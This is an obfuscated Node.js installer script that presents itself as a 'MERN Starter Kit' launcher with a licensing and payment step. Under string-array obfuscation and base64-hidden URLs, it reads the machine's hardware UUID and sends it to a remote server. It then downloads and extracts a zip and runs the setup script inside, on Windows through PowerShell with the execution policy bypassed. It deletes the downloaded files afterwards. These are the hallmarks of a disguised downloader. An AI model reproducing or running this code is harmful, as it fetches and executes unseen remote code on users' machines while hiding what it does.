#!/usr/bin/env node

const a0_0x32caa2 = a0_0xf510;
(function (_0x2bd3db, _0x5d686b) {
  const _0x4a6b22 = a0_0xf510,
    _0x328878 = _0x2bd3db();
  while (!![]) {
    try {
      const _0x1b100d =
        parseInt(_0x4a6b22(0x1b6)) / 0x1 +
        -parseInt(_0x4a6b22(0x1a5)) / 0x2 +
        (parseInt(_0x4a6b22(0x1a6)) / 0x3) *
          (-parseInt(_0x4a6b22(0x18a)) / 0x4) +
        parseInt(_0x4a6b22(0x1a9)) / 0x5 +
        (-parseInt(_0x4a6b22(0x1ad)) / 0x6) *
          (-parseInt(_0x4a6b22(0x1cf)) / 0x7) +
        -parseInt(_0x4a6b22(0x1b4)) / 0x8 +
        (parseInt(_0x4a6b22(0x199)) / 0x9) * (parseInt(_0x4a6b22(0x1bb)) / 0xa);
      if (_0x1b100d === _0x5d686b) break;
      else _0x328878["push"](_0x328878["shift"]());
    } catch (_0x2aa8b1) {
      _0x328878["push"](_0x328878["shift"]());
    }
  }
})(a0_0x47bb, 0x40a90);
function a0_0x47bb() {
  const _0x4581db = [
    "❌\x20Server\x20is\x20busy,\x20try\x20again\x20later!!",
    "Press\x20\x1b[32mENTER\x1b[0m\x20to\x20proceed\x20with\x20the\x20payment.",
    "36zJUxZA",
    "inherit",
    ".codeEaseX",
    "ignore",
    "push",
    "linux",
    "powershell.exe",
    "log",
    "ps1",
    "aHR0cHM6Ly9ocnV0aGlrLmFwaS5hbm94LnN0b3JlL2FwaS92MS9wYXltZW50L3JlZ2lzdGVy",
    "rmSync",
    "setup",
    "cmd",
    "url",
    "error",
    "353223JwDGOr",
    "🚨\x20Uncaught\x20Exception:",
    "dirname",
    "completed",
    "mernLauncher",
    "data",
    "writeFileSync",
    "ioreg\x20-rd1\x20-c\x20IOPlatformExpertDevice\x20|\x20awk\x20-F\x27\x22\x27\x20\x27/IOPlatformUUID/\x20{print\x20$4}\x27",
    "✅\x20verified\x20user,\x20Proceeding...",
    "✅\x20Payment\x20Successfull...",
    "❌\x20Server\x20is\x20Busy,\x20try\x20again\x20later!!",
    "message",
    "922672JyxouN",
    "75921pADVwi",
    "trim",
    "status",
    "2559730KYMKIv",
    "existsSync",
    "setRawMode",
    "-File",
    "3804xjLHgB",
    "Running\x20setup\x20for\x20",
    "post",
    "❌\x20Cleanup\x20failed:",
    "\x22\x20>\x20/dev/null\x202>&1\x20&",
    "...\x0a",
    "readFileSync",
    "3107928BxCgil",
    "base64",
    "190823MelDcO",
    "Bypass",
    "❌\x20Error\x20Invalid\x20License",
    "nohup\x20xdg-open\x20\x22",
    "split",
    "110bVJCNR",
    "from",
    "win32",
    "uncaughtException",
    "homedir",
    "Windows",
    "success",
    "exit",
    "mern-launcher",
    "stdin",
    "aHR0cHM6Ly9ocnV0aGlrLmFub3guc3RvcmUvcGF5bWVudA==",
    "platform",
    "❌\x20Payment\x20check\x20timed\x20out.\x20Please\x20try\x20again.",
    "✅\x20Successfully\x20completed!",
    "\x0aRedirecting\x20to\x20payment\x20page...",
    "toString",
    "license",
    "setup.zip",
    "cat\x20/var/lib/dbus/machine-id",
    "startsWith",
    "2296nohtVL",
    "wmic\x20csproduct\x20get\x20UUID",
    "resume",
    "\x0a\x20\x20\x20\x20=================================\x0a\x20\x20\x20\x20🚀\x20Welcome\x20to\x20the\x20MERN\x20Starter\x20Kit!\x0a\x20\x20\x20\x20Follow\x20the\x20prompts\x20to\x20configure\x20your\x20project.\x0a\x20\x20\x20\x20=================================\x0a\x20\x20",
    "aHR0cHM6Ly9ocnV0aGlrLmFwaS5hbm94LnN0b3JlL2FwaS92MS9zY3JpcHRzL2Rvd25sb2FkLXppcA==",
    "darwin",
    "utf-8",
    "arraybuffer",
    "credentials",
    "\x0a⚠️\x20\x20Process\x20interrupted.\x20Cleaning\x20up...",
    "-ExecutionPolicy",
    "unlinkSync",
    "resolve",
    "🔍\x20Checking,\x20Please\x20wait!!",
    "join",
  ];
  a0_0x47bb = function () {
    return _0x4581db;
  };
  return a0_0x47bb();
}
import { execSync, spawn } from "child_process";
import a0_0x3959b7 from "os";
import a0_0x3b69f4 from "path";
import { fileURLToPath } from "url";
import a0_0x18decb from "fs";
import a0_0x3bcc26 from "axios";
import a0_0x48023b from "adm-zip";
const homePath = a0_0x3959b7[a0_0x32caa2(0x1bf)](),
  codeEasePath = a0_0x3b69f4["join"](homePath, a0_0x32caa2(0x18c)),
  __filename = fileURLToPath(import.meta[a0_0x32caa2(0x197)]),
  __dirname = a0_0x3b69f4[a0_0x32caa2(0x19b)](__filename),
  packageDir = a0_0x3b69f4[a0_0x32caa2(0x185)](__dirname),
  setupDir = a0_0x3b69f4[a0_0x32caa2(0x187)](packageDir, a0_0x32caa2(0x195)),
  zipPath = a0_0x3b69f4[a0_0x32caa2(0x187)](packageDir, a0_0x32caa2(0x1cc)),
  package_name = a0_0x32caa2(0x1c3);
function a0_0xf510(_0x395d50, _0x41e7b5) {
  const _0x47bbbd = a0_0x47bb();
  return (
    (a0_0xf510 = function (_0xf5101b, _0x23dc1) {
      _0xf5101b = _0xf5101b - 0x17f;
      let _0x5c0f32 = _0x47bbbd[_0xf5101b];
      return _0x5c0f32;
    }),
    a0_0xf510(_0x395d50, _0x41e7b5)
  );
}
function cleanup() {
  const _0x404730 = a0_0x32caa2;
  try {
    a0_0x18decb[_0x404730(0x1aa)](zipPath) &&
      a0_0x18decb[_0x404730(0x184)](zipPath),
      a0_0x18decb[_0x404730(0x1aa)](setupDir) &&
        a0_0x18decb[_0x404730(0x194)](setupDir, {
          recursive: !![],
          force: !![],
        }),
      console["log"](_0x404730(0x1c8));
  } catch (_0x4a74cc) {
    console[_0x404730(0x198)](_0x404730(0x1b0), _0x4a74cc[_0x404730(0x1a4)]);
  }
}
async function generateUUID() {
  const _0x3a37c5 = a0_0x32caa2;
  let _0x354355;
  if (a0_0x3959b7["platform"]() === _0x3a37c5(0x1bd))
    _0x354355 = execSync(_0x3a37c5(0x1d0))
      [_0x3a37c5(0x1ca)]()
      [_0x3a37c5(0x1ba)]("\x0a")[0x1]
      ["trim"]();
  else {
    if (a0_0x3959b7[_0x3a37c5(0x1c6)]() === _0x3a37c5(0x18f))
      _0x354355 = execSync(_0x3a37c5(0x1cd))["toString"]()[_0x3a37c5(0x1a7)]();
    else
      a0_0x3959b7[_0x3a37c5(0x1c6)]() === _0x3a37c5(0x1d4) &&
        (_0x354355 = execSync(_0x3a37c5(0x1a0))
          [_0x3a37c5(0x1ca)]()
          [_0x3a37c5(0x1a7)]());
  }
  return _0x354355;
}
function getLicenseToken(_0x535f62) {
  const _0x5660a9 = a0_0x32caa2;
  if (!a0_0x18decb[_0x5660a9(0x1aa)](codeEasePath)) return null;
  const _0x2d2998 = a0_0x18decb[_0x5660a9(0x1b3)](
    codeEasePath,
    _0x5660a9(0x17f)
  )[_0x5660a9(0x1ba)]("\x0a");
  for (const _0x542373 of _0x2d2998) {
    if (_0x542373[_0x5660a9(0x1ce)](_0x535f62 + "="))
      return _0x542373[_0x5660a9(0x1ba)]("=")[0x1][_0x5660a9(0x1a7)]();
  }
  return null;
}
function saveLicenseToken(_0x5ce2af, _0x3626d8) {
  const _0xc487cb = a0_0x32caa2;
  let _0x354e35 = [],
    _0x1c5768 = ![];
  if (a0_0x18decb[_0xc487cb(0x1aa)](codeEasePath)) {
    const _0x407a2a = a0_0x18decb["readFileSync"](codeEasePath, "utf-8")[
      _0xc487cb(0x1ba)
    ]("\x0a");
    for (const _0x541485 of _0x407a2a) {
      _0x541485["startsWith"](_0x5ce2af + "=")
        ? (_0x354e35[_0xc487cb(0x18e)](_0x5ce2af + "=" + _0x3626d8),
          (_0x1c5768 = !![]))
        : _0x354e35[_0xc487cb(0x18e)](_0x541485);
    }
  }
  !_0x1c5768 && _0x354e35["push"](_0x5ce2af + "=" + _0x3626d8),
    a0_0x18decb[_0xc487cb(0x19f)](
      codeEasePath,
      _0x354e35[_0xc487cb(0x187)]("\x0a")
    );
}
async function installProject(_0x35bd6f) {
  const _0x55c8fd = a0_0x32caa2;
  try {
    const _0x24a794 = getLicenseToken(_0x35bd6f);
    if (!_0x24a794) {
      console["log"](
        "Please\x20purchase\x20a\x20license\x20" + _0x35bd6f + "."
      );
      return;
    }
    const _0x57a085 = await a0_0x3bcc26["post"](
      Buffer[_0x55c8fd(0x1bc)](_0x55c8fd(0x1d3), _0x55c8fd(0x1b5))[
        _0x55c8fd(0x1ca)
      ](_0x55c8fd(0x17f)),
      {
        licenseToken: _0x24a794,
        project: _0x55c8fd(0x19d),
        packageName: _0x35bd6f,
      },
      { responseType: _0x55c8fd(0x180) }
    );
    a0_0x18decb[_0x55c8fd(0x19f)](zipPath, _0x57a085[_0x55c8fd(0x19e)]);
    const _0x33f321 = new a0_0x48023b(zipPath);
    _0x33f321["extractAllTo"](setupDir, !![]);
  } catch (_0x4a225d) {
    console[_0x55c8fd(0x191)](_0x55c8fd(0x1a3)), process[_0x55c8fd(0x1c2)](0x1);
  }
}
async function checkLicense(_0x2c7020) {
  const _0x143578 = a0_0x32caa2;
  try {
    let _0x449b41 = getLicenseToken(_0x2c7020);
    if (_0x449b41) {
      const _0x31ef2f = await generateUUID(),
        _0x38a9cd = await a0_0x3bcc26[_0x143578(0x1af)](
          Buffer["from"](
            "aHR0cHM6Ly9ocnV0aGlrLmFwaS5hbm94LnN0b3JlL2FwaS92MS9wYXltZW50L2NoZWNrLXBheW1lbnQ=",
            _0x143578(0x1b5)
          )[_0x143578(0x1ca)](_0x143578(0x17f)),
          { packageName: _0x2c7020 },
          { headers: { "X-License-Key": _0x31ef2f } }
        );
      if (
        _0x38a9cd[_0x143578(0x19e)][_0x143578(0x181)][_0x143578(0x1a8)] ===
        _0x143578(0x19c)
      )
        return console["log"](_0x143578(0x1a1)), !![];
    }
    const _0x167903 = await generateUUID(),
      _0x4a51cb = await a0_0x3bcc26[_0x143578(0x1af)](
        Buffer[_0x143578(0x1bc)](_0x143578(0x193), _0x143578(0x1b5))[
          _0x143578(0x1ca)
        ](_0x143578(0x17f)),
        { packageName: _0x2c7020 },
        { headers: { "X-License-Key": _0x167903 } }
      );
    if (_0x4a51cb[_0x143578(0x19e)][_0x143578(0x1c1)])
      return (
        console[_0x143578(0x191)](_0x143578(0x189)),
        process[_0x143578(0x1c4)][_0x143578(0x1ab)](!![]),
        process["stdin"][_0x143578(0x1d1)](),
        new Promise((_0x1ceef7) => {
          const _0x1ffa54 = _0x143578;
          process[_0x1ffa54(0x1c4)]["on"]("data", async () => {
            const _0x4e9ef9 = _0x1ffa54;
            process[_0x4e9ef9(0x1c4)][_0x4e9ef9(0x1ab)](![]),
              process[_0x4e9ef9(0x1c4)]["pause"](),
              console[_0x4e9ef9(0x191)](_0x4e9ef9(0x1c9));
            const _0x38ecfd =
              Buffer[_0x4e9ef9(0x1bc)](_0x4e9ef9(0x1c5), "base64")["toString"](
                "utf-8"
              ) +
              "/" +
              package_name +
              "/" +
              _0x167903;
            if (a0_0x3959b7[_0x4e9ef9(0x1c6)]() === _0x4e9ef9(0x1bd))
              execSync("start\x20\x22\x22\x20\x22" + _0x38ecfd + "\x22", {
                stdio: _0x4e9ef9(0x18d),
              });
            else
              a0_0x3959b7[_0x4e9ef9(0x1c6)]() === "darwin"
                ? execSync("open\x20\x22" + _0x38ecfd + "\x22", {
                    stdio: "ignore",
                    detached: !![],
                  })
                : execSync(_0x4e9ef9(0x1b9) + _0x38ecfd + _0x4e9ef9(0x1b1), {
                    stdio: _0x4e9ef9(0x18d),
                    detached: !![],
                  });
            console["log"](
              "🔄\x20Waiting\x20for\x20payment\x20confirmation..."
            );
            let _0x46cdfd = ![],
              _0x216507 = 0x0;
            const _0x4229a5 = 0x2d;
            while (!_0x46cdfd && _0x216507 < _0x4229a5) {
              await new Promise((_0x2a1ad1) => setTimeout(_0x2a1ad1, 0x3a98)),
                _0x216507++;
              const _0x621cdf = await a0_0x3bcc26[_0x4e9ef9(0x1af)](
                Buffer[_0x4e9ef9(0x1bc)](
                  "aHR0cHM6Ly9ocnV0aGlrLmFwaS5hbm94LnN0b3JlL2FwaS92MS9wYXltZW50L2NoZWNrLXBheW1lbnQ=",
                  _0x4e9ef9(0x1b5)
                )["toString"](_0x4e9ef9(0x17f)),
                { packageName: _0x2c7020 },
                { headers: { "X-License-Key": _0x167903 } }
              );
              console[_0x4e9ef9(0x191)](_0x4e9ef9(0x186));
              if (
                _0x621cdf["data"][_0x4e9ef9(0x181)][_0x4e9ef9(0x1a8)] ===
                "completed"
              )
                return (
                  saveLicenseToken(
                    _0x2c7020,
                    _0x621cdf[_0x4e9ef9(0x19e)]["credentials"][_0x4e9ef9(0x1cb)]
                  ),
                  console[_0x4e9ef9(0x191)](_0x4e9ef9(0x1a2)),
                  (_0x46cdfd = !![]),
                  _0x1ceef7(!![]),
                  !![]
                );
            }
            console[_0x4e9ef9(0x191)](_0x4e9ef9(0x1c7)), process["exit"](0x1);
          });
        })
      );
  } catch (_0x381ed8) {
    console[_0x143578(0x191)](_0x143578(0x188)), process[_0x143578(0x1c2)](0x1);
  }
}
async function main() {
  const _0xe6fc07 = a0_0x32caa2;
  console[_0xe6fc07(0x191)](_0xe6fc07(0x1d2));
  const _0x109e76 = await checkLicense(package_name);
  !_0x109e76 && console[_0xe6fc07(0x191)](_0xe6fc07(0x1b8));
  await installProject(package_name);
  const _0x53afca = a0_0x3959b7[_0xe6fc07(0x1c6)](),
    _0x4a6d6a =
      _0x53afca === _0xe6fc07(0x1bd)
        ? a0_0x3b69f4[_0xe6fc07(0x187)](setupDir, _0xe6fc07(0x192), "setup.ps1")
        : a0_0x3b69f4["join"](setupDir, _0xe6fc07(0x196), "setup.sh"),
    _0x37caf4 = a0_0x3b69f4[_0xe6fc07(0x185)](__dirname, _0x4a6d6a);
  console[_0xe6fc07(0x191)](
    _0xe6fc07(0x1ae) +
      (_0x53afca === "win32" ? _0xe6fc07(0x1c0) : "Linux/macOS") +
      _0xe6fc07(0x1b2)
  ),
    spawn(
      _0x53afca === _0xe6fc07(0x1bd) ? _0xe6fc07(0x190) : "bash",
      _0x53afca === _0xe6fc07(0x1bd)
        ? [_0xe6fc07(0x183), _0xe6fc07(0x1b7), _0xe6fc07(0x1ac), _0x37caf4]
        : [_0x37caf4],
      { stdio: _0xe6fc07(0x18b) }
    );
}
process["on"](a0_0x32caa2(0x1c2), cleanup),
  process["on"]("SIGINT", () => {
    const _0x576fc2 = a0_0x32caa2;
    console[_0x576fc2(0x191)](_0x576fc2(0x182)),
      cleanup(),
      process[_0x576fc2(0x1c2)](0x1);
  }),
  process["on"](a0_0x32caa2(0x1be), (_0x2aaa8f) => {
    const _0x5d5462 = a0_0x32caa2;
    console["error"](_0x5d5462(0x19a), _0x2aaa8f),
      cleanup(),
      process["exit"](0x1);
  }),
  main();
